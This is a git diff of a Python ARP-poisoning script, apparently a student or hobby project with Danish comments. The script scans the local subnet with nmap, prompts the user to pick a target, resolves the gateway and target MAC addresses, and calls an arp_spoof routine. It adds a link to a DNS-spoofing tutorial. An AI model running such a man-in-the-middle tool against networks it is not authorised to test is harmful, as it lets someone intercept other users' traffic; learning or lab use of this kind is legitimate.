@@ -88,7 +88,6 @@ def arp_reset(gateway_mac, gateway_ip, target_mac, target_ip):
 	except Exception as error:
 		print (error)
 
-#Her koden "starter"
 
 interfaces = netifaces.interfaces()
 nmscan = nmap.PortScanner()
@@ -109,8 +108,9 @@ try:
 except Exception as error:
 	print("Specified interface does not exist - specific error message: \n", error)
 
-#print(ip_address)
-#print(subnet_mask)
+print(ip_address)
+print(subnet_mask)
+
 try:
 	ip_inter = ipaddress.ip_interface(f"{ip_address}/{subnet_mask}")
 	network = ip_inter.network # 192.168.171.0/24
@@ -127,14 +127,16 @@ try:
 		counter += 1
 	poisen_choice = input("\nChoose target to poisen - use numbers, eg. 2: ")
 	print (host_list[int(poisen_choice)])
-
 	gateway_mac = find_mac(gateway)
 	print("Gateway mac: ", gateway_mac)
 	target_mac = find_mac(host_list[int(poisen_choice)])
 	print ("Target mac: ", target_mac)
 	arp_spoof(gateway_mac, gateway, target_mac, host_list[int(poisen_choice)])
+
 except KeyboardInterrupt:
 	print("CTRL ^ C was pressed")
 	for i in range(20):
 		arp_reset(gateway_mac, gateway, target_mac, host_list[int(poisen_choice)])
 		time.sleep(1)
+
+# Den her kunne godt virke: https://www.thepythoncode.com/article/make-dns-spoof-python
